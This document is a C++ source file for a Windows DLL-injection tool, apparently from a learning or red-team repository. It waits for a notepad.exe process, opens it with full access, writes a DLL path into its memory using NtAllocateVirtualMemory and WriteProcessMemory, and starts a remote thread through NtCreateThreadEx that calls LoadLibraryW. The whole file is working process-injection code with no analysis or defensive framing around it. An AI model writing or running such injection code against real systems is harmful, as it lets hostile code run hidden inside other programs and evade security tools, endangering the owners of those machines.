#include <cstdio>
#include <unistd.h>
#include <ntdef.h>
#include "../utils.h"
#include "../ntdllfunc.h"

DWORD WaitForNotepad() {
    DWORD dNotepadPid = 0;
    int i = 0;
    while (true) {
        printf("[-] Searching for notepad...\n");
        dNotepadPid = FindFirstNotepad();
        if (!dNotepadPid) {
            printf("[!] No notepad found! Waiting for round %d...\n", i++);
            sleep(5);
        }
        else break;
    }
    return dNotepadPid;
}

int main() {
    // Vars
    DWORD dNotepadPid = 0;
    HANDLE hNotepad = nullptr;
    HANDLE hRemoteThread;
    HMODULE hKernel32 = nullptr;
    HMODULE hNtDll = nullptr;
    PTHREAD_START_ROUTINE lpLoadLibAddr = nullptr;
    PVOID lpAllocatedMemory = 0;
    NTSTATUS status;
    LPFUN_NtCreateThreadEx lpCreateThreadEx;
    LPFUN_NtAllocateVirtualMemory lpAllocateVirtualMemory;
    wchar_t cDllLocation[MAX_PATH] = LR"(C:\Users\Public\dlls\libbasicdll.dll)";
    size_t sSizeDllLocation = sizeof(cDllLocation);
    // Getting addresses
    if (!(hKernel32 = GetModuleHandle(TEXT("Kernel32")))) goto error;
    if (!(hNtDll = GetModuleHandle(TEXT("ntdll.dll")))) goto error;
    printf("[+] Found module handles\n");
    // OpenProcess
    if (!(lpLoadLibAddr = (PTHREAD_START_ROUTINE) GetProcAddress(hKernel32, "LoadLibraryW"))) goto error;
    if (!(lpAllocateVirtualMemory = (LPFUN_NtAllocateVirtualMemory) GetProcAddress(hNtDll, "NtAllocateVirtualMemory"))) goto error;
    // WriteProcessMemory
    if (!(lpCreateThreadEx = (LPFUN_NtCreateThreadEx) GetProcAddress(hNtDll, "NtCreateThreadEx"))) goto error;
    printf("[+] Found function addresses\n");
    // Code
    dNotepadPid = WaitForNotepad();
    printf("[+] Found notepad.exe with PID %lu\n", dNotepadPid);
    if(!(hNotepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dNotepadPid))) goto error;
    printf("[+] Opened notepad.exe process\n");
    // Injecting
    if(!NT_SUCCESS(status = lpAllocateVirtualMemory(hNotepad, &lpAllocatedMemory, 0, &sSizeDllLocation, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) goto nt_error;
    printf("[+] Allocated %zu bytes in process for payload of size %llu\n", sSizeDllLocation, sizeof(cDllLocation));
    if(!WriteProcessMemory(hNotepad, lpAllocatedMemory, (LPVOID) cDllLocation, sizeof(cDllLocation), nullptr)) goto error;
    printf("[+] DLL injected\n");
    if(!NT_SUCCESS(status = lpCreateThreadEx(&hRemoteThread, 0x1FFFFF, nullptr, hNotepad, (LPTHREAD_START_ROUTINE) lpLoadLibAddr, lpAllocatedMemory, FALSE, 0, 0, 0, nullptr))) goto nt_error;
    printf("[+] Remote thread started\n");
    CloseHandle(hNotepad);
    return EXIT_SUCCESS;
    // Kill everything
    error:
    if (hNotepad) CloseHandle(hNotepad);
    printError((GetLastError()));
    return EXIT_FAILURE;
    nt_error:
    if (hNotepad) CloseHandle(hNotepad);
    printError((status));
    return EXIT_FAILURE;
}